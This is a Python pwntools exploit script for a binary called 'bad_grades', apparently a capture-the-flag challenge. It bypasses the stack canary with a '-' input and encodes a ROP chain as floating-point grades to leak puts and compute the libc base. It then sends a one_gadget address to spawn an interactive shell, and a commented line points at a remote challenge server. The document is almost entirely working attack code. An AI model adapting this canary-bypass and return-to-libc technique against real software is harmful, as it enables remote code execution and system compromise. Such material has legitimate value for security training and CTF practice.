from pwn import *
import time
import struct 
stop = True
p = process('./bad_grades')

pid = gdb.attach(p, gdbscript="""
           b * 0x4010ec
      """)
def send_grade(grade, p):
    p.sendlineafter(': ', str(grade))


#p.sendlineafter('> ','2')

#p.sendlineafter(': ', '33')
#send_grade('-')
#send_grade('2')
#for e in range(33):
#    send_grade('-')
#payload = 33+canary+rbp+poprdiret+puts@got+puts@plt+main = 39
def exploit():
    global stop
    #leak 
    #p = remote('46.101.63.43',30990)
    p.sendlineafter('> ','2')
    p.sendlineafter(': ', '39')
    for e in range(33):
        send_grade(e,p)
    send_grade('-',p)
    send_grade(1,p)
    send_grade(2.0745866000000000*10**-317,p)
    #00601fa8
    send_grade(3.1123957000000000*10**-317,p)
    #00400680
    send_grade(2.0730830000000000*10**-317,p)
    #00401108
    send_grade(2.0744150000000000*10**-317,p)
    p.recvline()
    leak = u64(p.recv(6).ljust(8,'\0'))
    
    libc_base = leak -0x080aa0
    system = libc_base + 0x04f550
    bin_sh = libc_base + 0x1b3e1a
    one_gadget =  libc_base + 0x10a41c
    one_gadget2 = libc_base + 0x4f432
    one_gadget3 = libc_base + 0x4f3d5


    #info block

    #print "leak(puts): "+ hex(leak)
    print "libc base: " + hex(libc_base)
    #print "system@glibc: " +hex(system)
    #print "bin_sh@glibc: " +hex(bin_sh)
    #print "one_gadget: " + hex(one_gadget)
    print "one_gadget2: " + hex(one_gadget2)
    #print "one_gadget3: " + hex(one_gadget3)
    #return to libc
    #pop_rdi_ret+bin_sh+ret+system
    p.sendlineafter('> ','2')
    p.sendlineafter(': ', '36')
    for e in range(33):
        send_grade(e,p)
    send_grade('-',p)
    send_grade(1,p)
    #pop_rdi
    #send_grade(2.0745866000000000*10**-317)
    #bin_sh
    one_gadget_float = str(struct.unpack('>d', binascii.unhexlify(hex(one_gadget2).replace('0x','').rjust(16,'0')))[0])
    one_gadget_float = float(one_gadget_float.replace('e-310',''))
    print "bin_sh float: " + str(one_gadget_float)
    send_grade(one_gadget_float * 10 ** -310,p)

    """
    bin_sh_float = str(struct.unpack('>d', binascii.unhexlify(hex(bin_sh).replace('0x','').rjust(16,'0')))[0])
    bin_sh_float = float(bin_sh_float.replace('e-310',''))
    print "bin_sh float: " + str(bin_sh_float)
    send_grade(bin_sh_float * 10 ** -310)
    #ret
    send_grade(2.0730703000000000*10**-317)
    #system
    
    system_float = str(struct.unpack('>d', binascii.unhexlify(hex(system).replace('0x','').rjust(16,'0')))[0])
    system_float = float(system_float.replace('e-310',''))
    print "system float: "+str(system_float)

    send_grade(system_float * 10 ** -310)
    """
    p.recv(6999)
    p.interactive()
    """
    print stop
    try:
        print "REACHED"
        print "wtf: "+ p.recvline()
    except EOFError:
        print "Reached2"
        p.interactive()
    #p.sendline('ls')

    print "random stop testing"
    try:
        p.sendline('ls')
        print "trying"
        #print p.recvline()
        #print p.sendline('ls')
        a = p.recvline()
        print "HIT: "+ a
        #p.recvline()

        if "bad" in a:
            print "life: "+a
            print 'HIT!!!!!!!!!!!!!!!'
            p.interactive()
            stop = False
    except EOFError:
        print "fail"
        p.close()
        p.shutdown()
    p.shutdown()
    p.close()
    """

exploit()
    



